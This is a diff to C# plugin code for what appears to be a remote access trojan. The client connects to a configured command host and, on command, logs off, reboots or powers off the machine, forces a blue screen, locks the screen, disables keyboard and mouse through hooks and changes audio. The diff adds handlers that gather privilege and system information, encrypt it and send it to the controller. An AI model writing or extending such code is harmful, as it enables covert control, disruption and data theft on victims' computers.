@@ -1,5 +1,4 @@
 ﻿using Shared;
-using System;
 using System.Net;
 using System.Net.Sockets;
 using System.Text;
@@ -23,93 +22,110 @@ namespace Plugin
                 Socket S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                 IPEndPoint ep = new IPEndPoint(IPAddress.Parse(H.host), H.port);
                 S.Connect(ep);
-                Shared.PacketTypes.PacketType T = (Shared.PacketTypes.PacketType)Param[0];
+                PacketType T = (PacketType)Param[0];
                 Data D = new Data();
+                D.HWID = HWID;
+                D.IP_Origin = BaseIP;
                 switch (T)
                 {
-                    case Shared.PacketTypes.PacketType.LOG_OUT_SYS:
+                    case PacketType.LOG_OUT_SYS:
                         await Task.Run(() => Functions.PowerOptions(NativeAPI.Miscellaneous.EWX_LOGOFF, 0));
                         break;
 
-                    case Shared.PacketTypes.PacketType.REBOOT_SYS:
+                    case PacketType.REBOOT_SYS:
                         await Task.Run(() => Functions.PowerOptions(NativeAPI.Miscellaneous.EWX_REBOOT, 0 | NativeAPI.Miscellaneous.SHTDN_REASON_MINOR_BLUESCREEN));
                         break;
 
-                    case Shared.PacketTypes.PacketType.POWER_OFF_SYS:
+                    case PacketType.POWER_OFF_SYS:
                         await Task.Run(() => Functions.PowerOptions(NativeAPI.Miscellaneous.EWX_POWEROFF, 0 | NativeAPI.Miscellaneous.SHTDN_REASON_MAJOR_SOFTWARE));
                         break;
 
-                    case PacketTypes.PacketType.SUSPEND_SYS:
+                    case PacketType.SUSPEND_SYS:
                         await Task.Run(() => Functions.Suspend());
                         break;
 
-                    case PacketTypes.PacketType.HIBERNATE_SYS:
+                    case PacketType.HIBERNATE_SYS:
                         await Task.Run(() => Functions.Hibernate());
                         break;
 
-                    case Shared.PacketTypes.PacketType.HIDE_DI:
+                    case PacketType.HIDE_DI:
                         await Task.Run(() => Functions.DesktopIcons(false));
                         break;
 
-                    case Shared.PacketTypes.PacketType.SHOW_DI:
+                    case PacketType.SHOW_DI:
                         await Task.Run(() => Functions.DesktopIcons(true));
                         break;
 
-                    case Shared.PacketTypes.PacketType.HIDE_TB:
+                    case PacketType.HIDE_TB:
                         await Task.Run(() => Functions.TaskBar(0));
                         break;
 
-                    case Shared.PacketTypes.PacketType.SHOW_TB:
+                    case PacketType.SHOW_TB:
                         await Task.Run(() => Functions.TaskBar(1));
                         break;
 
-                    case PacketTypes.PacketType.SCRL_ON:
+                    case PacketType.SCRL_ON:
                         await Task.Run(() => Functions.StartScreenLocker());
                         break;
 
-                    case PacketTypes.PacketType.SRCL_OFF:
+                    case PacketType.SRCL_OFF:
                         await Task.Run(() => Functions.StopScreenLocker());
                         break;
 
-                    case Shared.PacketTypes.PacketType.BSOD_SYS:
+                    case PacketType.BSOD_SYS:
                         await Task.Run(() => Functions.BSOD());
                         break;
 
-                    case PacketTypes.PacketType.KB_ON:
+                    case PacketType.KB_ON:
                         await Task.Run(() => Functions.UnhookKeyboard());
                         break;
 
-                    case PacketTypes.PacketType.KB_OFF:
+                    case PacketType.KB_OFF:
                         await Task.Run(() => Functions.HookKeyboard());
                         break;
 
-                    case PacketTypes.PacketType.MS_ON:
+                    case PacketType.MS_ON:
                         await Task.Run(() => Functions.UnhookMouse());
                         break;
 
-                    case PacketTypes.PacketType.MS_OFF:
+                    case PacketType.MS_OFF:
                         await Task.Run(() => Functions.HookMouse());
                         break;
 
-                    case PacketTypes.PacketType.SET_DESK_WP:
+                    case PacketType.SET_DESK_WP:
                         b = (byte[])Param[1];
                         await Task.Run(() => Functions.SetWallPaper(b , Param[2].ToString()));
                         break;
 
-                    case PacketTypes.PacketType.GET_PRIV:
+                    case PacketType.GET_PRIV:
                         await Task.Run(() => Functions.GetPrivilege((int)Param[1], ref D));
-                        D.HWID = HWID;
-                        D.Type = Shared.PacketTypes.PacketType.GET_PRIV;
-                        D.IP_Origin = BaseIP;
+                        D.Type = PacketType.GET_PRIV;
+                        await Task.Run(() => SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
+                        break;
+
+                    case PacketType.MUTE_AUDIO:
+                        await Task.Run(() => Functions.MuteSound());
+                        break;
+
+                    case PacketType.AUDIO_UP:
+                        await Task.Run(() => Functions.SoundUp());
+                        break;
+
+                    case PacketType.AUDIO_DOWN:
+                        await Task.Run(() => Functions.SoundDown());
+                        break;
+
+                    case PacketType.GET_INFORMATION:
+                        b = (byte[])Param[1];
+                        await Task.Run(() => Functions.GetInformation(ref b, ref D));
+                        D.Type = Shared.PacketType.GET_INFORMATION;
                         await Task.Run(() => SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                         break;
                 }
                 S.Close();
                 S.Dispose();
             }
-            catch (Exception)
-            {
-            }
+            catch {}
             finally
             {
                 Shared.Utils.ClearMem();
